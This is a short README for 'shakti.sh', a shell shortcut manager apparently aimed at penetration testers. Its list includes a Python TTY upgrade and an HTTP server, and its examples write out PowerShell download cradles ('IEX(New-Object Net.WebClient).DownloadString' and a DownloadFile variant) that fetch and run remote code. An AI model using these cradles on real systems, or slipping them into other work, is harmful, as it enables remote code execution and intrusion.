# Magic

## Intruduction

Simple tool to help with long repetitive shortcuts

## Usage

List all shortucts

```
./shakti.sh list

 ▄▀▀▀▀▄  ▄▀▀▄ ▄▄   ▄▀▀█▄   ▄▀▀▄ █  ▄▀▀▀█▀▀▄  ▄▀▀█▀▄   
█ █   ▐ █  █   ▄▀ ▐ ▄▀ ▀▄ █  █ ▄▀ █    █  ▐ █   █  █  
   ▀▄   ▐  █▄▄▄█    █▄▄▄█ ▐  █▀▄  ▐   █     ▐   █  ▐  
▀▄   █     █   █   ▄▀   █   █   █    █          █     
 █▀▀▀     ▄▀  ▄▀  █   ▄▀  ▄▀   █   ▄▀        ▄▀▀▀▀▀▄  
 ▐       █   █    ▐   ▐   █    ▐  █         █       █ 
         ▐   ▐            ▐       ▐         ▐       ▐           
    Cosmic alias


Shortcut	|	Command
========================================================
list		-	List all commands
add [shotcut] [cmd]-	Add or modify existing shortcut
dell [shortcut]	-	Delete shorcut
info [shortcut]	-	Get Shortcut info details
tty		-	get python tty
http		-	Python server
iex		-	Powershell test
psds		-	Powershell IEX Download String
```

Get information about shorcut

```
./shakti.sh info psds

 ▄▀▀▀▀▄  ▄▀▀▄ ▄▄   ▄▀▀█▄   ▄▀▀▄ █  ▄▀▀▀█▀▀▄  ▄▀▀█▀▄   
█ █   ▐ █  █   ▄▀ ▐ ▄▀ ▀▄ █  █ ▄▀ █    █  ▐ █   █  █  
   ▀▄   ▐  █▄▄▄█    █▄▄▄█ ▐  █▀▄  ▐   █     ▐   █  ▐  
▀▄   █     █   █   ▄▀   █   █   █    █          █     
 █▀▀▀     ▄▀  ▄▀  █   ▄▀  ▄▀   █   ▄▀        ▄▀▀▀▀▀▄  
 ▐       █   █    ▐   ▐   █    ▐  █         █       █ 
         ▐   ▐            ▐       ▐         ▐       ▐           
    Cosmic alias


Shortcut :psds
Command: echo -n "IEX(New-Object Net.WebClient).DownloadString(\"$2\")"| xclip -selection clipboard;echo "Copied"

Description: Powershell IEX Download String
```

Add command 

```bash
$ ./shakti.sh add psdf 'echo "IEX(New-Object Net.WebClient).DownloadFile(\"$2\",\"$3\")"' 'Powershell Download Files'
```

Run your shortcut